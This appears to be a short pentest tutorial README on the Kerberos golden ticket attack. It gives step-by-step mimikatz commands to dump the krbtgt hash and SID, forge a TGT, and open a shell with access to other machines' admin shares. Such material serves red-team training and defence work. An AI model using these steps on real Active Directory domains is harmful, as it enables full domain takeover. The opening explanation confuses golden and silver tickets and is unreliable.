# Golden-Ticket-Attack

A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.

### Golden Ticket Attacks w/ mimikatz 
Using mimikatz.exe, we gonna dump the krbtgt hash and sid.
```markdown
.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

![OnPaste 20220614-120938](https://user-images.githubusercontent.com/106917304/173510236-d02a0fdd-2e67-4a81-9763-e6d210e480bc.png)


Now generate golden ticket using krbtgt hash and sid.
```markdown
kerberos::golden /user: /domain: /sid: /krbtgt: /id:
```
NOTE: id is set to 500 for golden ticket attack.


![OnPaste 20220614-121203](https://user-images.githubusercontent.com/106917304/173510532-09a2930d-83f2-4137-b483-b5461c6e3ed4.png)

Use the Golden Ticket to access other machine.

This will open a new command prompt with elevated privileges to all machines.
```markdown
misc::cmd
```
![OnPaste 20220614-121351](https://user-images.githubusercontent.com/106917304/173510764-a28e6a59-7adf-4e2f-9b23-7a4f98a5e89d.png)


Access other Machines! - You will now have another command prompt with access to all other machines on the network.

```markdown
dir \\DESKTOP-1\c$
```

![OnPaste 20220614-121503](https://user-images.githubusercontent.com/106917304/173511018-f5e167eb-8cd5-46d9-91a3-d8c4ab2ce233.png)


![OnPaste 20220614-122214](https://user-images.githubusercontent.com/106917304/173512248-f68d86b3-ed7e-47c3-8ca8-dfa09be766f2.png)


